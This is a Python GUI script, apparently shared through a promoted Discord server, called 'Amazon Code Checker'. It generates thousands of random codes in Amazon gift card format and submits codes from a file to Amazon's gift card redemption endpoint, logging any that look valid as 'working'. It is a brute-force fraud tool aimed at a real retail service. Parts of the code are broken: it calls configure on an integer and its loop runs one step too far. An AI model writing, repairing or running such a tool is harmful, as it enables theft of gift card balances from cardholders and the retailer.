import tkinter 
import customtkinter
from tkinter import filedialog
import random
import requests

root = customtkinter.CTk()

root.geometry("640x480")
root.title("AMAZON CODE CHECKER V1.0 - MARS")


titleLabel = customtkinter.CTkLabel(root, text="AMAZON CODE CHECKER", font=("helvetica", 30))
titleLabel.place(relx=0.18, rely=0.05)

promoLabel = customtkinter.CTkLabel(root, text="discord.gg/9RRnqJGJaY", font=("helvetica", 20))
promoLabel.place(relx=0.31, rely=0.15)

#COMBOS

combos = []

def addCombos():
    with open("combos.txt") as f:
        for items in f:
            combo = items.strip()
            combos.append(combo)
    print(combos)
    checkedLabel.configure(text=("Codes: " + (str(len(combos)))))

def removeCombos():
    f = open("combos.txt", "w")
    f.write("")

combosFrame = customtkinter.CTkFrame(root, width=180, height=305, border_width=1, border_color="#404040")
combosFrame.place(relx=0.01, rely=0.28)

combosLabel = customtkinter.CTkLabel(combosFrame, text="CODES",  font=("helvetica", 16))
combosLabel.place(relx=0.32, rely=0.02)

combosAddBtn = customtkinter.CTkButton(combosFrame, text="Add", width=140, height=30, border_width=1, border_color="#404040", command=addCombos)
combosAddBtn.place(relx=0.1, rely=0.7)

combosClearBtn = customtkinter.CTkButton(combosFrame, text="Clear", width=140, height=30, border_width=1, border_color="#404040", command=removeCombos)
combosClearBtn.place(relx=0.1, rely=0.81)




#GENERATOR

generated = []

def generateCodes():

    charList = ["A", "B", "C",  "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]

    for i in range(0, 9999):
        codeline1 = ("").join(random.choices(charList, k=4))
        codeline2 = ("").join(random.choices(charList, k=6))
        codeline3 = ("").join(random.choices(charList, k=4))
        toCheckCode = str(codeline1 + "-" + codeline2 + "-" + codeline3)
        generated.append(toCheckCode)
        f = open("generated.txt", "a")
        f.write(f"{toCheckCode} \n")

def removeCodes():
    f = open("generated.txt", "w")
    f.write("")

generateFrame = customtkinter.CTkFrame(root, width=438, height=140, border_width=1, border_color="#404040")
generateFrame.place(relx=0.307, rely=0.28)

generateLabel = customtkinter.CTkLabel(generateFrame, text="GENERATOR",  font=("helvetica", 16))
generateLabel.place(relx=0.380, rely=0.02)

generateAddBtn = customtkinter.CTkButton(generateFrame, text="Generate", width=180, height=30, border_width=1, border_color="#404040", command=generateCodes)
generateAddBtn.place(relx=0.09, rely=0.71)

generateClearBtn = customtkinter.CTkButton(generateFrame, text="Clear", width=180, height=30, border_width=1, border_color="#404040", command=removeCodes)
generateClearBtn.place(relx=0.51, rely=0.71)



#Checker

def checker():

    hits = 0

    checkerRange = len(combos)

    for i in range(0, checkerRange + 1):
        code = combos[0]
        del combos[0]
        success_keyword = "<b>Enter claim code</b>"
        r = requests.post("https://www.amazon.com/gc/redeem?ref_=gcui_b_e_r_c_d_b_w", data={f"giftcard": {code}})
        if success_keyword in r.text:
            f = open("working.txt", "a")
            f.write(code + '\n')
            hits = hits + 1
            hits.configure(text=("Hits: " + str(hits)))
        else:
            print(code)

checkerFrame = customtkinter.CTkFrame(root, width=438, height=150, border_width=1, border_color="#404040")
checkerFrame.place(relx=0.307, rely=0.6)

checkerLabel = customtkinter.CTkLabel(checkerFrame, text="CHECKER",  font=("helvetica", 16))
checkerLabel.place(relx=0.42, rely=0.02)

checkerStartBtn = customtkinter.CTkButton(checkerFrame, text="Start", width=180, height=30, border_width=1, border_color="#404040", command=checker)
checkerStartBtn.place(relx=0.09, rely=0.71)

checkerStopBtn = customtkinter.CTkButton(checkerFrame, text="Stop", width=180, height=30, border_width=1, border_color="#404040")
checkerStopBtn.place(relx=0.51, rely=0.71)

hitsLabel = customtkinter.CTkLabel(checkerFrame, text="Hits: ",  font=("helvetica", 12), fg_color="#2b2b2b", bg_color="#2b2b2b")
hitsLabel.place(relx=0.21, rely=0.4)

checkedLabel = customtkinter.CTkLabel(checkerFrame, text="Checked: ",  font=("helvetica", 12), fg_color="#2b2b2b", bg_color="#2b2b2b")
checkedLabel.place(relx=0.657, rely=0.4)

root.mainloop()